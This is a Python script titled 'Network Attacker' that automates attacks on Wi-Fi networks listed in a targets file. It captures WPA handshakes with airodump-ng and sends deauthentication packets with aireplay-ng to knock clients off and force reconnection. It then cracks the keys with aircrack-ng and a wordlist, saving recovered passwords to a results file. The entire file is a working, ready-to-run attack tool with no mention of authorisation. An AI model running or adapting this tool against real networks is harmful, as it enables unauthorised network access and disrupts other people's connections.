"""
Name:           Network Attacker 
Version:        1.3
Author:         Lucas G. 
Description:    Reads target, captures Handshakes and attempts to brute force Wifi using a wordlist
Date:           11.12.2024
Usage:          python3 network_attacker.py
Dependencies:   aircrack-ng, Python 3.x, Targets file, Wordlist, wireless adapter supporting monitor mode
"""
#Load modules
import subprocess, csv, os, time, json, glob

def load_config(config_file="wpconfig.json"):
    """
    Loads central config file

    - Load config file
    - Error handling
    """
    try:
        with open(config_file, "r") as f:
            return json.load(f)
    except FileNotFoundError:
        print(f"[ERROR] Configuration file '{config_file}' not found.")
        exit(1)

def read_targets(network_info):
    """
    Reads network info file and extracts all columns as targets

    - Read network info and extract all columns as targets
    - Error handling
    """
    try:
        with open(network_info, "r") as file:
            reader = csv.DictReader(file)
            targets = [
                {"mac": row["MAC"].strip(), "ssid": row["SSID"].strip(), "channel": row["Channel"].strip()}
                for row in reader
                if row["MAC"] and row["SSID"] and row["Channel"]
            ]
        print(f"[INFO] Loaded {len(targets)} targets from {network_info}")
        return targets
    
    except Exception as e:
        print(f"[ERROR] Failed to read targets file: {e}")
        exit(1)

def rfkill_unblock():
    """
    Unblocks (potentially) disabled Wifi Hardware

    - Unblock all wifi adapters
    - Error handling
    """
    try:
        os.system("rfkill unblock wifi")
        print("[INFO] wifi is unblocked")
    except Exception as e:
        print(f"[ERROR] Something went wrong, wifi still blocked: {e}")

def capture_handshake(interface, target, handshakes_dir):
    """
    Capture handshakes and send deauthentication packets to client to force handshake

    - Define variables
    - Start airodump-ng to capture packets for all targets in network info file
    - Send deauthentication packets to force handshake
    - Error handling
    """
    mac = target["mac"]
    ssid = target["ssid"].replace(" ", "_") 
    channel = target["channel"]
    output_handshake = os.path.join(handshakes_dir, f"{ssid}_{mac}")

    print(f"[INFO] Starting handshake capture for {ssid} ({mac}) on channel {channel}...")
    try:
        airodump_process = subprocess.Popen(
            ["airodump-ng", "--bssid", mac, "--channel", channel, "--write", output_handshake, interface],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        time.sleep(10)  

        print(f"[INFO] Sending deauthentication packets to {ssid} ({mac})...")
        subprocess.run(
            ["aireplay-ng", "--deauth", "10", "-a", mac, interface ],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=True
        )
        time.sleep(10)  

        airodump_process.terminate()  
        print(f"[INFO] Finished capturing handshake for {ssid} ({mac}).")

        cap_file = f"{output_handshake}-01.cap"
        if os.path.exists(cap_file):
            print(f"[SUCCESS] Handshake captured for {ssid} ({mac}).")
            return True
        else:
            print(f"[WARN] No handshake captured for {ssid} ({mac}).")
            return False
    except Exception as e:
        print(f"[ERROR] Error capturing handshake for {ssid} ({mac}): {e}")
        return False

def attack_network(wordlist, target, handshakes_dir, results_file):
    """
    Perform attack using information collected from previous functions and scripts

    - Define variables
    - Perform (brute force) attack using aircrack-ng, captured handshake and provided wordlist
    - If wordlist contains the key, a success message is displayed and the key is writted into 'crack_results' file
    - If wordlist doesn't contain the key, a failed to crack message is displayed and the result is displayed as failed in the 'crack_results' file
    - Error handling
    """
    mac = target["mac"]
    ssid = target["ssid"]
    base_filename = f"{ssid.replace(' ', '_')}_{mac}"
    handshake_files = glob.glob(os.path.join(handshakes_dir, f"{base_filename}-*.cap"))

    if not handshake_files:
        print(f"[WARN] No handshake file found for {ssid} ({mac}). Skipping attack.")
        return

    handshake_file = sorted(handshake_files)[-1]
    print(f"[INFO] Starting wordlist attack on {ssid} ({mac}) using {handshake_file}...")

    try:
        result = subprocess.run(
            ["aircrack-ng", "-w", wordlist, "-b", mac, handshake_file],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        if "KEY FOUND" in result.stdout:
            key = result.stdout.split("KEY FOUND!")[1].split("\n")[0].strip()
            print(f"[SUCCESS] Cracked {ssid} ({mac})! Key: {key}")
            with open(results_file, "a") as outfile:
                outfile.write(f"{ssid},{mac},Success,{key}\n")
        else:
            print(f"[FAIL] Failed to crack {ssid} ({mac}).")
            with open(results_file, "a") as outfile:
                outfile.write(f"{ssid},{mac},Failed,\n")
    except Exception as e:
        print(f"[ERROR] Error attacking {ssid} ({mac}): {e}")
        with open(results_file, "a") as outfile:
            outfile.write(f"{ssid},{mac},Error,\n")

def main():
    """
    Main function to call functions and create handshakes output 

    - Call 'load_config' function and define variables
    - Create handshakes output directory
    - Call 'read_targets' function
    - If targets is not empty, execute attack by calling 'capture_handshake' & 'attack_network' function
    - Error handling
    """
    config = load_config()
    network_info = config.get("network_info")
    handshakes_dir = config.get("handshakes_dir")
    wordlist = config.get("wordlist")
    results_file = config.get("results_file")
    interface = config.get("interface")

    if not os.path.exists(handshakes_dir):
        os.makedirs(handshakes_dir)
        print(f"[INFO] Created handshakes directory: {handshakes_dir}")

    targets = read_targets(network_info)
    if not targets:
        print("[ERROR] No valid targets found in network_info.csv.")
        exit(1)

    for target in targets:
        rfkill_unblock()
        capture_handshake(interface, target, handshakes_dir)

    for target in targets:
        attack_network(wordlist, target, handshakes_dir, results_file)

    print(f"[INFO] Network attacks completed. Results saved to {results_file}")

if __name__ == "__main__":
    main()
